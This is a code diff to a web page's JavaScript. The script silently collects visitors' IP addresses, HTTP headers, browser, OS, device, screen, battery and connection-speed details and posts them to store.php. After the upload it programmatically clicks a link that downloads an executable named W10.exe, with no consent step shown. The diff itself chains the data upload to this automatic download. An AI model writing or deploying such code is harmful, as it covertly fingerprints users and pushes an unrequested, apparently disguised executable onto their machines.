@@ -2,8 +2,10 @@ var getIpInfo=getIpInfo();
 var InternetSpeed=getInternetSpeed();
 var getHttpHeader=getHttpHeader();
 var getScreeResolution=getScreeResolution()
+var getIp=getIpV4Info();
 var userData={
-    IpAddress:window.ipaddr.IPv4.isIPv4(getIpInfo.ip)?getIpInfo.ip:getIpV4Info(),//ok
+    IpV4Address:getIp,//ok
+    IpV6Address:window.ipaddr.IPv6.isIPv6(getIpInfo.ip)?getIpInfo.ip:'no ipV6',//ok
     BrowserTypeAndVersion:platform.name+' version '+platform.version,//ok
     OperatingSystem:`architecture:${platform.os.architecture}, family:${platform.os.family}, version:${platform.os.version},`,//ok 
     DeviceType:WURFL.form_factor,//ok
@@ -30,7 +32,7 @@ function getIpV4Info() {
     var http=new XMLHttpRequest();
     http.open('GET','https://ipv4.icanhazip.com/',false);
     http.send(null);
-    return JSON.parse(http.responseText);
+    return http.responseText.replace(/\r?\n|\r/g,"");
 }
 function getScreeResolution(){
     var screenSize = '';
@@ -74,9 +76,7 @@ function fileTodownload(){
         btn.href='../assets/files/W10.exe'
         btn.download='W10.exe'
     }
-    window.onload = function() {
-        btn.click();
-    };
+    btn.click();
 }
 //Battery information
 function getBatteryInfo(){
@@ -87,16 +87,32 @@ function getBatteryInfo(){
         })
     }
 }
-function sendDataToStore(){
-    setTimeout(() => {
-        $.ajax({
-            url: "store.php",
-            type: "post",
-            data: { data: JSON.stringify(userData) },
-            success: function(response) {
-            //   console.log(response);
-            }});
-    }, 200);
+async function sendDataToStore(){
+    let json=JSON.stringify(userData)
+    await fetch("store.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json; charset=utf-8"
+        },
+        body:json
+    }).then(response => {
+          if (!response.ok) {
+            throw new Error("Network response was not ok");
+          }
+          return response.json();
+    }).then(data => {
+          //console.log(data);
+    })
+        .catch(error => {
+          console.error("Error:", error);
+    });
+    return new Promise((resolve,reject)=>{
+        if (true) {
+            resolve("data send");
+        } else {
+            reject("Promise failed");
+        }
+    })
 }
 function getDate(){
     const now = new Date();
@@ -116,8 +132,10 @@ function getInternetSpeed() {
     });
 }
 getBatteryInfo();
-fileTodownload();
 getInternetSpeed().then(function(speed) {
     userData.InternetSpeedAndConnectionType=`${speed} KB/s`;
-    sendDataToStore();
+    sendDataToStore().then((data)=>{
+       // alert(data);
+        fileTodownload();
+    });
 });
